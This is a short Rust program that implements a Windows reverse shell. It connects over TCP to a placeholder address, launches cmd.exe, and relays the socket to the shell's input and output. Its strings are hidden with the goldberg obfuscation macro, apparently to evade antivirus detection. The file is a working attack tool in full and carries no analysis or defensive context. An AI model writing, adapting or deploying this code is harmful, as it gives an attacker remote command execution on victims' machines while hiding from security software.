use tokio::io::{self, AsyncReadExt};
use tokio::net::TcpStream;
use tokio::process::Command;
use goldberg::goldberg_string;

#[tokio::main]
async fn main() -> io::Result<()> {
    let addr = goldberg_string!("machine_ip:port").to_string();
    let mut stream = TcpStream::connect(&addr).await?;

    let mut process = Command::new(goldberg_string!("cmd.exe"))
        .arg(goldberg_string!("/K"))
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .spawn()
        .expect("Failed to spawn child process");

    let (mut rd, mut wr) = stream.split();

    let mut stdin = process.stdin.take().unwrap();
    let mut stdout = process.stdout.take().unwrap();

    tokio::select! {
    result = io::copy(&mut rd, &mut stdin) => {
        if let Err(e) = result {
            eprintln!("Failed to read from TCP stream or write to process stdin: {}", e);
        }
    },
    result = io::copy(&mut stdout, &mut wr) => {
        if let Err(e) = result {
            eprintln!("Failed to read from process stdout or write to TCP stream: {}", e);
        }
    },
}

    Ok(())
}